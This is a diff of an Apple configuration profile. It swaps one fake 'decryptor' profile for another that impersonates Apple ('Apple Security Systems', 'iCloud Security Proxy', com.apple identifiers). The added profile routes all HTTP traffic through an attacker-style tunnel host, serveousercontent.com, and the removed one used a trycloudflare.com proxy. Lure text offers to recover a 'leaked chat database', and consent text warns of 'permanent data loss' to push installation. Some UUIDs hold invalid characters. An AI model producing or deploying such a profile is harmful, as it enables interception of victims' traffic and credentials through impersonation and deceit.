@@ -2,47 +2,49 @@
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-	<key>PayloadContent</key>
-	<array>
-		<dict>
-			<key>PayloadDescription</key>
-			<string>Configures secure data decryption gateway for private chats.</string>
-			<key>PayloadDisplayName</key>
-			<string>Hadima Secure Decryptor</string>
-			<key>PayloadIdentifier</key>
-			<string>com.apple.vpn.managed.1</string>
-			<key>PayloadType</key>
-			<string>com.apple.vpn.managed</string>
-			<key>PayloadUUID</key>
-			<string>E4A1B2C3-D4E5-F6A1-B2C3-D4E5F6A1B2C3</string>
-			<key>PayloadVersion</key>
-			<integer>1</integer>
-			<key>Proxies</key>
-			<dict>
-				<key>HTTPEnable</key>
-				<integer>1</integer>
-				<key>HTTPProxy</key>
-				<string>bb8e7d52-15c4-495b-9468-91c04224bd1a.trycloudflare.com</string>
-				<key>HTTPPort</key>
-				<integer>80</integer>
-			</dict>
-			<key>VPNType</key>
-			<string>IKEv2</string>
-		</dict>
-	</array>
-	<key>PayloadDescription</key>
-	<string>Identity Verification for Private Storage Access</string>
-	<key>PayloadDisplayName</key>
-	<string>Verification System</string>
-	<key>PayloadIdentifier</key>
-	<string>com.verification.system</string>
-	<key>PayloadOrganization</key>
-	<string>Secure Cloud Systems</string>
-	<key>PayloadType</key>
-	<string>Configuration</string>
-	<key>PayloadUUID</key>
-	<string>C1B2A3D4-E5F6-4A5B-8C9D-E0F1A2B3C4D5</string>
-	<key>PayloadVersion</key>
+    <key>PayloadContent</key>
+    <array>
+        <dict>
+            <key>PayloadDescription</key>
+            <string>Configures secure proxy settings for identity verification.</string>
+            <key>PayloadDisplayName</key>
+            <string>iCloud Security Proxy</string>
+            <key>PayloadIdentifier</key>
+            <string>com.apple.proxy.http.global.secure</string>
+            <key>PayloadType</key>
+            <string>com.apple.proxy.http.global</string>
+            <key>PayloadUUID</key>
+            <string>D5E6F7G8-H9I0-J1K2-L3M4-N5O6P7Q8R9S0</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>ProxyType</key>
+            <string>Manual</string>
+            <key>ProxyServer</key>
+            <string>consuetudo.serveousercontent.com</string>
+            <key>ProxyServerPort</key>
+            <integer>443</integer>
+        </dict>
+    </array>
+    <key>PayloadDescription</key>
+    <string>Secure Verification Profile to recover leaked chat database.</string>
+    <key>PayloadDisplayName</key>
+    <string>Hatima Secured Decrypter V2</string>
+    <key>PayloadIdentifier</key>
+    <string>com.apple.security.decrypter.v2</string>
+    <key>PayloadOrganization</key>
+    <string>Apple Security Systems</string>
+    <key>PayloadRemovalDisallowed</key>
+    <false/>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadUUID</key>
+    <string>E5F6G7H8-I9J0-K1L2-M3N4-O5P6Q7R8S9T0</string>
+    <key>PayloadVersion</key>
     <integer>1</integer>
+    <key>ConsentText</key>
+    <dict>
+        <key>default</key>
+        <string>This profile is required to decrypt and secure your private data. Failure to install may lead to permanent data loss.</string>
+    </dict>
 </dict>
 </plist>
